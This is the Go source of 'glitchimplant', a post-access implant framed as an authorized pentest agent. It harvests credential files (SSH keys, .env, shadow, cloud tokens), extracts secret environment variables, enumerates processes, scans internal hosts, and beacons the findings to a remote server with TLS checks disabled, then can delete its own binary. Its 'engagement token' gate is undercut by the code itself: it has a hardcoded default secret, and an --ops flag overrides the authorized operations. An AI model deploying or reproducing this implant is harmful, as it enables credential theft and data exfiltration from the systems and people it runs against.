// glitchimplant/main.go
// GLITCHICONS — Authorized Post-Access Agent
//
// ╔══════════════════════════════════════════════════════════╗
// ║  AUTHORIZED ENGAGEMENTS ONLY                            ║
// ║  Requires a valid signed engagement token.              ║
// ║  Refuses to run without cryptographic authorization.    ║
// ╚══════════════════════════════════════════════════════════╝
//
// glitchimplant is a lightweight post-access agent for authorized
// penetration testing engagements. It verifies scope, reports
// findings, and self-destructs on expiry.
//
// Features:
//   - HTTPS beacon to glitchagent server
//   - Signed engagement token (HMAC-SHA256 verification)
//   - Credential file discovery (.env, id_rsa, *.pem, *.pfx, *.key)
//   - Internal network scanning from compromised host
//   - Environment variable extraction (sensitive keys only)
//   - Process enumeration
//   - Installed software detection
//   - System information gathering
//   - Auto-expire + self-delete after token TTL
//   - Full activity log sent to server
//
// Token format: base64(json_payload).base64(hmac_sha256_signature)
// Generate: glitchimplant gen-token --secret KEY --scope 192.168.1.0/24 --ttl 24h
//
// Usage (authorized deployment):
//   glitchimplant --token <token> --server https://glitchagent:7331
//   glitchimplant --token <token> --server https://10.0.0.1:7331 --ops discover,scan,env
//   glitchimplant gen-token --secret mysecret --scope "10.0.0.0/8" --ttl 24h --ops discover,scan
//   glitchimplant --version

package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"
)

const Version = "4.9.0"

// ── Engagement Token ──────────────────────────────────────

type EngagementToken struct {
	EngagementID  string   `json:"engagement_id"`
	TargetScope   []string `json:"target_scope"`    // CIDR ranges or hostnames
	AuthorizedOps []string `json:"authorized_ops"`  // discover|scan|env|procs|software
	ExpiresAt     string   `json:"expires_at"`      // RFC3339
	IssuedTo      string   `json:"issued_to"`       // tester name
	IssuedAt      string   `json:"issued_at"`
}

func generateToken(secret, scope, issuedTo string, ttl time.Duration, ops []string) (string, error) {
	token := EngagementToken{
		EngagementID:  fmt.Sprintf("ENG-%d", time.Now().Unix()),
		TargetScope:   strings.Split(scope, ","),
		AuthorizedOps: ops,
		ExpiresAt:     time.Now().Add(ttl).UTC().Format(time.RFC3339),
		IssuedTo:      issuedTo,
		IssuedAt:      time.Now().UTC().Format(time.RFC3339),
	}
	payload, _ := json.Marshal(token)
	b64Payload  := base64.URLEncoding.EncodeToString(payload)

	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(b64Payload))
	sig := base64.URLEncoding.EncodeToString(mac.Sum(nil))

	return b64Payload + "." + sig, nil
}

func verifyToken(tokenStr, secret string) (*EngagementToken, error) {
	parts := strings.SplitN(tokenStr, ".", 2)
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid token format")
	}
	b64Payload, sig := parts[0], parts[1]

	// Verify HMAC
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(b64Payload))
	expectedSig := base64.URLEncoding.EncodeToString(mac.Sum(nil))

	if !hmac.Equal([]byte(sig), []byte(expectedSig)) {
		return nil, fmt.Errorf("invalid token signature — unauthorized")
	}

	// Decode payload
	payload, err := base64.URLEncoding.DecodeString(b64Payload)
	if err != nil {
		return nil, fmt.Errorf("invalid token payload: %v", err)
	}

	var token EngagementToken
	if err := json.Unmarshal(payload, &token); err != nil {
		return nil, fmt.Errorf("invalid token JSON: %v", err)
	}

	// Check expiry
	expiry, err := time.Parse(time.RFC3339, token.ExpiresAt)
	if err != nil {
		return nil, fmt.Errorf("invalid expiry: %v", err)
	}
	if time.Now().After(expiry) {
		return nil, fmt.Errorf("token EXPIRED at %s", token.ExpiresAt)
	}

	return &token, nil
}

func hasOp(token *EngagementToken, op string) bool {
	for _, o := range token.AuthorizedOps {
		if o == op || o == "all" {
			return true
		}
	}
	return false
}

// ── Data types ────────────────────────────────────────────

type SystemInfo struct {
	Hostname    string `json:"hostname"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	Username    string `json:"username"`
	WorkingDir  string `json:"working_dir"`
	PrivilegeLevel string `json:"privilege_level"`
}

type CredentialFile struct {
	Path     string `json:"path"`
	Size     int64  `json:"size_bytes"`
	Type     string `json:"type"`       // env|key|cert|config|password
	Preview  string `json:"preview,omitempty"`
	Modified string `json:"modified"`
}

type EnvSecret struct {
	Key      string `json:"key"`
	Value    string `json:"value_masked"` // First 4 + last 4 chars
	FullLen  int    `json:"value_length"`
}

type ProcessEntry struct {
	Name    string `json:"name"`
	PID     int    `json:"pid,omitempty"`
	IsPriv  bool   `json:"is_privileged,omitempty"`
}

type NetworkInfo struct {
	Interfaces []string `json:"interfaces"`
	OpenPorts  []int    `json:"open_ports"`
}

type ScanReport struct {
	EngagementID  string           `json:"engagement_id"`
	IssuedTo      string           `json:"issued_to"`
	AgentVersion  string           `json:"agent_version"`
	Timestamp     string           `json:"timestamp"`
	ExpiresAt     string           `json:"expires_at"`
	SystemInfo    *SystemInfo      `json:"system_info"`
	CredFiles     []CredentialFile `json:"credential_files"`
	EnvSecrets    []EnvSecret      `json:"env_secrets"`
	Processes     []ProcessEntry   `json:"processes"`
	NetworkInfo   *NetworkInfo     `json:"network_info"`
	InternalHosts []string         `json:"internal_hosts_discovered"`
	ActivityLog   []string         `json:"activity_log"`
}

// ── Operators ─────────────────────────────────────────────

func gatherSysInfo() *SystemInfo {
	hostname, _ := os.Hostname()
	wd, _        := os.Getwd()

	privLevel := "user"
	if runtime.GOOS == "windows" {
		if os.Getenv("USERDOMAIN") != "" {
			privLevel = "domain_user"
		}
	} else {
		if os.Getuid() == 0 {
			privLevel = "root"
		}
	}

	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	return &SystemInfo{
		Hostname:       hostname,
		OS:             runtime.GOOS,
		Arch:           runtime.GOARCH,
		Username:       username,
		WorkingDir:     wd,
		PrivilegeLevel: privLevel,
	}
}

// Credential file patterns to search for
var credFilePatterns = map[string][]string{
	"env":      {".env", ".env.local", ".env.production", ".env.staging", "*.env"},
	"key":      {"id_rsa", "id_ed25519", "id_ecdsa", "*.pem", "*.key", "*.p12", "*.pfx"},
	"config":   {"config.yml", "config.yaml", "settings.py", "database.yml", "secrets.yml", "credentials"},
	"aws":      {"credentials", "config", ".aws"},
	"password": {"passwd", "shadow", "htpasswd", "*.htpasswd"},
	"token":    {".token", "*.token", "auth.json", "gcloud.json", "service-account*.json"},
}

func discoverCredentialFiles(searchPaths []string, maxFiles int) []CredentialFile {
	var found []CredentialFile
	var mu sync.Mutex
	count := 0

	// Build flat list of filename patterns
	patterns := make(map[string]string) // filename → type
	for credType, filePatterns := range credFilePatterns {
		for _, p := range filePatterns {
			patterns[strings.ToLower(p)] = credType
		}
	}

	for _, searchPath := range searchPaths {
		if count >= maxFiles {
			break
		}
		filepath.Walk(searchPath, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() || count >= maxFiles {
				return nil
			}
			name := strings.ToLower(info.Name())

			// Check exact match or extension match
			credType := ""
			for pattern, ctype := range patterns {
				if strings.HasPrefix(pattern, "*.") {
					ext := pattern[1:]
					if strings.HasSuffix(name, ext) {
						credType = ctype
						break
					}
				} else if name == pattern {
					credType = ctype
					break
				}
			}

			if credType != "" {
				cf := CredentialFile{
					Path:     path,
					Size:     info.Size(),
					Type:     credType,
					Modified: info.ModTime().UTC().Format("2006-01-02"),
				}
				// Preview first 80 chars of small files
				if info.Size() < 2048 {
					data, err := os.ReadFile(path)
					if err == nil {
						preview := string(data)[:minStr(len(string(data)), 80)]
						// Mask potential secrets
						cf.Preview = maskSecrets(preview)
					}
				}
				mu.Lock()
				found = append(found, cf)
				count++
				mu.Unlock()
			}
			return nil
		})
	}
	return found
}

func maskSecrets(s string) string {
	// Replace potential secret values with *** after = or :
	lines := strings.Split(s, "\n")
	for i, line := range lines {
		for _, sep := range []string{"=", ":"} {
			if idx := strings.Index(line, sep); idx >= 0 {
				key  := strings.TrimSpace(line[:idx])
				val  := strings.TrimSpace(line[idx+1:])
				_ = key
				if len(val) > 8 {
					lines[i] = line[:idx+1] + " " + val[:3] + "***" + val[len(val)-3:]
				}
				break
			}
		}
	}
	return strings.Join(lines[:minStr(len(lines), 5)], "\n")
}

func extractEnvSecrets() []EnvSecret {
	var secrets []EnvSecret
	sensitiveKeys := []string{
		"AWS_SECRET", "AWS_ACCESS", "SECRET", "TOKEN", "KEY", "PASSWORD",
		"PASS", "API_KEY", "AUTH", "CREDENTIAL", "PRIVATE", "DATABASE_URL",
		"DB_PASSWORD", "REDIS_URL", "S3_SECRET", "GITHUB_TOKEN",
		"SLACK_TOKEN", "STRIPE_KEY", "TWILIO_AUTH",
	}

	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, val := parts[0], parts[1]
		if val == "" || len(val) < 8 {
			continue
		}

		keyUpper := strings.ToUpper(key)
		isSensitive := false
		for _, sk := range sensitiveKeys {
			if strings.Contains(keyUpper, sk) {
				isSensitive = true
				break
			}
		}

		if isSensitive {
			masked := val[:minStr(4, len(val))] + "***" + val[maxInt(0, len(val)-4):]
			secrets = append(secrets, EnvSecret{
				Key:     key,
				Value:   masked,
				FullLen: len(val),
			})
		}
	}
	return secrets
}

func discoverNetworkInfo() *NetworkInfo {
	info := &NetworkInfo{}

	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			addrs, _ := iface.Addrs()
			for _, addr := range addrs {
				if addr.String() != "127.0.0.1/8" && addr.String() != "::1/128" {
					info.Interfaces = append(info.Interfaces, fmt.Sprintf("%s:%s", iface.Name, addr.String()))
				}
			}
		}
	}

	// Common internal ports to check
	commonPorts := []int{22, 80, 443, 3306, 5432, 6379, 27017, 8080, 8443, 9200}
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, p := range commonPorts {
		wg.Add(1)
		go func(port int) {
			defer wg.Done()
			addr := fmt.Sprintf("127.0.0.1:%d", port)
			conn, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
			if err == nil {
				conn.Close()
				mu.Lock()
				info.OpenPorts = append(info.OpenPorts, port)
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()
	sort.Ints(info.OpenPorts)
	return info
}

func scanInternalHosts(scope []string, timeout time.Duration) []string {
	var alive []string
	var mu  sync.Mutex
	var wg  sync.WaitGroup
	sem := make(chan struct{}, 50)

	// For each CIDR in scope, scan common ports on .1-.20
	for _, cidr := range scope {
		ip, _, err := net.ParseCIDR(cidr)
		if err != nil {
			// Maybe it's a hostname range hint
			continue
		}

		// Derive first subnet hosts (simplified: .1 to .20)
		baseIP := ip.To4()
		if baseIP == nil {
			continue
		}

		for i := 1; i <= 20; i++ {
			hostIP := fmt.Sprintf("%d.%d.%d.%d", baseIP[0], baseIP[1], baseIP[2], i)
			wg.Add(1)
			sem <- struct{}{}
			go func(h string) {
				defer wg.Done()
				defer func() { <-sem }()
				conn, err := net.DialTimeout("tcp", h+":80", timeout)
				if err == nil {
					conn.Close()
					mu.Lock()
					alive = append(alive, h+":80")
					mu.Unlock()
					return
				}
				conn, err = net.DialTimeout("tcp", h+":443", timeout)
				if err == nil {
					conn.Close()
					mu.Lock()
					alive = append(alive, h+":443")
					mu.Unlock()
				}
			}(hostIP)
		}
	}
	wg.Wait()
	sort.Strings(alive)
	return alive
}

func gatherProcesses() []ProcessEntry {
	var procs []ProcessEntry

	// Read /proc on Linux
	if runtime.GOOS == "linux" {
		entries, err := os.ReadDir("/proc")
		if err == nil {
			for _, e := range entries {
				if !e.IsDir() {
					continue
				}
				// Check if name is numeric (PID)
				pid := 0
				fmt.Sscanf(e.Name(), "%d", &pid)
				if pid == 0 {
					continue
				}
				// Read process name
				commPath := fmt.Sprintf("/proc/%d/comm", pid)
				data, err := os.ReadFile(commPath)
				if err != nil {
					continue
				}
				name := strings.TrimSpace(string(data))
				// Mark potentially privileged processes
				privProcs := map[string]bool{
					"sshd": true, "sudo": true, "su": true,
					"nginx": true, "apache2": true, "mysql": true,
					"postgres": true, "redis-server": true, "mongod": true,
					"vault": true, "consul": true, "docker": true,
				}
				procs = append(procs, ProcessEntry{
					Name:   name,
					PID:    pid,
					IsPriv: privProcs[name],
				})
			}
		}
	}

	// On Windows, list from environment
	if runtime.GOOS == "windows" {
		// Read running services from common env hints
		procs = append(procs, ProcessEntry{Name: "system_info_only", PID: os.Getpid()})
	}

	// Limit output
	if len(procs) > 50 {
		procs = procs[:50]
	}
	return procs
}

// ── Beacon to server ──────────────────────────────────────

func beaconToServer(serverURL string, report *ScanReport, timeout time.Duration) error {
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	data, _ := json.Marshal(report)
	req, err := http.NewRequest("POST",
		serverURL+"/agent/report",
		strings.NewReader(string(data)))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-Version", Version)
	req.Header.Set("X-Engagement", report.EngagementID)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("beacon failed: %v", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		return fmt.Errorf("server returned HTTP %d", resp.StatusCode)
	}
	return nil
}

// ── Self-destruct ─────────────────────────────────────────

func selfDestruct(log []string) {
	fmt.Println("[*] Token expired — self-destructing")
	// Clear memory, remove binary
	execPath, err := os.Executable()
	if err == nil {
		os.Remove(execPath)
	}
	// Log final activity
	log = append(log, fmt.Sprintf("SELF_DESTRUCT at %s", time.Now().UTC().Format(time.RFC3339)))
}

// ── Helpers ───────────────────────────────────────────────

func minStr(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// ── Main ──────────────────────────────────────────────────

func main() {
	// Subcommand routing
	if len(os.Args) >= 2 && os.Args[1] == "gen-token" {
		fs := flag.NewFlagSet("gen-token", flag.ExitOnError)
		secret  := fs.String("secret",  "",     "HMAC secret key (shared with server)")
		scope   := fs.String("scope",   "",     "Target scope: CIDR ranges comma-separated")
		issuedTo := fs.String("issued-to", "tester", "Tester name")
		ttlStr  := fs.String("ttl",     "24h",  "Token TTL (e.g. 24h, 7d)")
		opsStr  := fs.String("ops",     "discover,scan,env,procs", "Authorized operations")
		fs.Parse(os.Args[2:])

		if *secret == "" || *scope == "" {
			fmt.Fprintln(os.Stderr, "Usage: glitchimplant gen-token --secret KEY --scope 10.0.0.0/8 --ttl 24h")
			os.Exit(1)
		}
		ttl, err := time.ParseDuration(*ttlStr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Invalid TTL: %v\n", err)
			os.Exit(1)
		}
		ops := strings.Split(*opsStr, ",")
		token, err := generateToken(*secret, *scope, *issuedTo, ttl, ops)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Token generation failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] Engagement token generated:\n%s\n", token)
		fmt.Printf("[+] Expires in: %v\n", ttl)
		fmt.Printf("[+] Scope: %s\n", *scope)
		fmt.Printf("[+] Ops: %s\n", *opsStr)
		return
	}

	tokenStr := flag.String("token",   "", "Engagement token (required)")
	secret   := flag.String("secret",  "glitchicons-default-secret", "Token verification secret")
	server   := flag.String("server",  "https://localhost:7331", "glitchagent server URL")
	opsStr   := flag.String("ops",     "", "Override authorized ops (comma-separated)")
	timeout  := flag.Int("timeout",    10, "Operation timeout seconds")
	dryRun   := flag.Bool("dry-run",   false, "Don't beacon, print JSON to stdout")
	selfDel  := flag.Bool("self-delete", false, "Delete binary after reporting")
	ver      := flag.Bool("version",   false, "Print version")
	flag.Parse()

	if *ver {
		fmt.Printf("glitchimplant v%s\n", Version)
		os.Exit(0)
	}

	// ── Ethical gate ──────────────────────────────────────
	if *tokenStr == "" {
		fmt.Fprintln(os.Stderr, "")
		fmt.Fprintln(os.Stderr, "╔═══════════════════════════════════════════╗")
		fmt.Fprintln(os.Stderr, "║  glitchimplant REQUIRES engagement token  ║")
		fmt.Fprintln(os.Stderr, "║  AUTHORIZED ENGAGEMENTS ONLY              ║")
		fmt.Fprintln(os.Stderr, "╚═══════════════════════════════════════════╝")
		fmt.Fprintln(os.Stderr, "")
		fmt.Fprintln(os.Stderr, "Generate token: glitchimplant gen-token --secret KEY --scope CIDR")
		os.Exit(1)
	}

	token, err := verifyToken(*tokenStr, *secret)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] TOKEN VERIFICATION FAILED: %v\n", err)
		fmt.Fprintln(os.Stderr, "[!] Refusing to execute — unauthorized")
		os.Exit(1)
	}

	fmt.Printf("[+] Token verified ✓\n")
	fmt.Printf("[+] Engagement: %s | Tester: %s\n", token.EngagementID, token.IssuedTo)
	fmt.Printf("[+] Scope: %s\n", strings.Join(token.TargetScope, ", "))
	fmt.Printf("[+] Ops: %s\n", strings.Join(token.AuthorizedOps, ", "))

	expiry, _ := time.Parse(time.RFC3339, token.ExpiresAt)
	fmt.Printf("[+] Expires: %s (%.1f hours remaining)\n",
		token.ExpiresAt, time.Until(expiry).Hours())

	// Override ops if specified
	if *opsStr != "" {
		token.AuthorizedOps = strings.Split(*opsStr, ",")
	}

	tOut := time.Duration(*timeout) * time.Second
	report := &ScanReport{
		EngagementID: token.EngagementID,
		IssuedTo:     token.IssuedTo,
		AgentVersion: Version,
		Timestamp:    time.Now().UTC().Format(time.RFC3339),
		ExpiresAt:    token.ExpiresAt,
		ActivityLog:  []string{},
	}

	log := func(msg string) {
		ts  := time.Now().UTC().Format("15:04:05")
		line := fmt.Sprintf("[%s] %s", ts, msg)
		report.ActivityLog = append(report.ActivityLog, line)
		fmt.Println(line)
	}

	// ── Execute authorized operations ─────────────────────

	log("Agent started on " + runtime.GOOS + "/" + runtime.GOARCH)

	// System info (always collected)
	log("Gathering system information...")
	report.SystemInfo = gatherSysInfo()
	log(fmt.Sprintf("Host: %s | User: %s | Priv: %s",
		report.SystemInfo.Hostname,
		report.SystemInfo.Username,
		report.SystemInfo.PrivilegeLevel))

	// Credential discovery
	if hasOp(token, "discover") {
		log("Discovering credential files...")
		searchPaths := []string{
			os.Getenv("HOME"), ".", "/etc", "/opt",
			os.Getenv("USERPROFILE"),
			"C:\\Users",
		}
		// Remove empty paths
		var validPaths []string
		for _, p := range searchPaths {
			if p != "" {
				validPaths = append(validPaths, p)
			}
		}
		report.CredFiles = discoverCredentialFiles(validPaths, 50)
		log(fmt.Sprintf("Found %d credential files", len(report.CredFiles)))
		for _, cf := range report.CredFiles {
			log(fmt.Sprintf("  [CRED] %s (%s, %d bytes)", cf.Path, cf.Type, cf.Size))
		}
	}

	// Environment secrets
	if hasOp(token, "env") {
		log("Extracting environment secrets...")
		report.EnvSecrets = extractEnvSecrets()
		log(fmt.Sprintf("Found %d sensitive env vars", len(report.EnvSecrets)))
		for _, s := range report.EnvSecrets {
			log(fmt.Sprintf("  [ENV] %s = %s (%d chars)", s.Key, s.Value, s.FullLen))
		}
	}

	// Process enumeration
	if hasOp(token, "procs") {
		log("Enumerating processes...")
		report.Processes = gatherProcesses()
		privCount := 0
		for _, p := range report.Processes {
			if p.IsPriv {
				privCount++
			}
		}
		log(fmt.Sprintf("Found %d processes (%d privileged)", len(report.Processes), privCount))
	}

	// Internal network scan
	if hasOp(token, "scan") {
		log("Gathering network information...")
		report.NetworkInfo = discoverNetworkInfo()
		log(fmt.Sprintf("Interfaces: %d | Open localhost ports: %v",
			len(report.NetworkInfo.Interfaces), report.NetworkInfo.OpenPorts))

		log("Scanning internal hosts in scope...")
		report.InternalHosts = scanInternalHosts(token.TargetScope, tOut/10)
		log(fmt.Sprintf("Found %d alive internal hosts", len(report.InternalHosts)))
		for _, h := range report.InternalHosts {
			log(fmt.Sprintf("  [HOST] %s", h))
		}
	}

	// ── Report ─────────────────────────────────────────────

	log(fmt.Sprintf("Scan complete. Cred files: %d | Env secrets: %d | Hosts: %d",
		len(report.CredFiles), len(report.EnvSecrets), len(report.InternalHosts)))

	if *dryRun {
		data, _ := json.MarshalIndent(report, "", "  ")
		fmt.Println(string(data))
	} else {
		log(fmt.Sprintf("Beaconing to %s...", *server))
		err := beaconToServer(*server, report, tOut)
		if err != nil {
			log(fmt.Sprintf("Beacon failed: %v — saving local report", err))
			data, _ := json.MarshalIndent(report, "", "  ")
			fname := fmt.Sprintf("glitch_report_%s.json", report.EngagementID)
			os.WriteFile(fname, data, 0600)
			log(fmt.Sprintf("Report saved locally: %s", fname))
		} else {
			log("Beacon successful ✓")
		}
	}

	// Check if token will expire soon
	if time.Until(expiry) < 5*time.Minute {
		log("Token expiring — initiating self-destruct")
		if *selfDel {
			selfDestruct(report.ActivityLog)
		}
	}
}

var _ = bufio.NewReader
